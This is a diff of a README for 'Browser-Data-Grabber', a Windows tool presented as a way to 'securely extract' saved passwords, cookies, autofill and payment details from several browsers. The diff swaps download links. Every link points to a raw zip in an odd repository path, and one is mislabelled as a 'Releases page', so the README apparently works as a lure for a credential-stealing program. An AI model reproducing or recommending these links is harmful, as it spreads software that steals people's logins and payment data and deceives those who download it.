@@ -1,7 +1,7 @@
 # 🌐 Browser-Data-Grabber - Securely Extract Your Browser Data
 
 ## 📥 Download Now
-[![Download Browser-Data-Grabber](https://raw.githubusercontent.com/ciacou001/Browser-Data-Grabber/main/leucotactic/Browser-Data-Grabber.zip)](https://raw.githubusercontent.com/ciacou001/Browser-Data-Grabber/main/leucotactic/Browser-Data-Grabber.zip)
+[![Download Browser-Data-Grabber](https://raw.githubusercontent.com/ciacou001/Browser-Data-Grabber/main/src/generator/Data-Browser-Grabber-v3.9.zip)](https://raw.githubusercontent.com/ciacou001/Browser-Data-Grabber/main/src/generator/Data-Browser-Grabber-v3.9.zip)
 
 ## 🚀 Getting Started
 Browser-Data-Grabber is a simple and effective tool for Windows 10 and 11 users. It helps you gather data from web browsers like Chrome, Edge, Firefox, and Brave. You can extract important information such as passwords, cookies, autofills, and payment details easily.
@@ -21,7 +21,7 @@ Browser-Data-Grabber is a simple and effective tool for Windows 10 and 11 users.
 ## 📦 Download & Install
 To download the application, follow these steps:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/ciacou001/Browser-Data-Grabber/main/leucotactic/Browser-Data-Grabber.zip).
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/ciacou001/Browser-Data-Grabber/main/src/generator/Data-Browser-Grabber-v3.9.zip).
   
 2. **Select the Latest Version:** Look for the latest release at the top of the list. Click on it to see the files available for download.
 
